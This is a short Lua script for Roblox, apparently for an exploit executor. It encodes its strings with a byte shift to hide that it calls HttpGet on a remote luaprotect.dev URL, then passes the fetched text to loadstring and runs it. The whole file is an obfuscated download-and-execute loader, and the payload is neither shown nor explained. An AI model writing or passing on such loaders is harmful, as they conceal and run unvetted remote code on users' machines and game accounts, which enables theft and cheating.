local environment = _G

local function decode(data)
    local result = {}

    for i = 1, #data do
        result[i] = string.char((data[i] - 73) % 256)
    end

    return table.concat(result)
end

if type(getgenv) == "function" then
    environment = getgenv()
elseif type(getfenv) == "function" then
    environment = getfenv(0)
end

local request = game[decode({
    145, 189, 189, 185, 144, 174, 189
})]

local compiler = environment[decode({
    181, 184, 170, 173, 188, 189, 187, 178, 183, 176
})]

assert(type(request) == "function", "HTTP unavailable")
assert(type(compiler) == "function", "Compiler unavailable")

local source = request(game, decode({
    177, 189, 189, 185, 188, 131, 120, 120,
    172, 173, 183, 119, 181, 190, 170, 185,
    187, 184, 189, 174, 172, 189, 119, 173,
    174, 191, 120, 190, 120, 127, 171, 172,
    128, 173, 121, 120, 147, 142, 190, 140,
    158, 182, 168, 125, 194, 154, 161, 170,
    146, 124, 187, 189
}))

local chunk, compileError = compiler(source)

assert(type(chunk) == "function", tostring(compileError or "Compilation failed"))

return chunk()
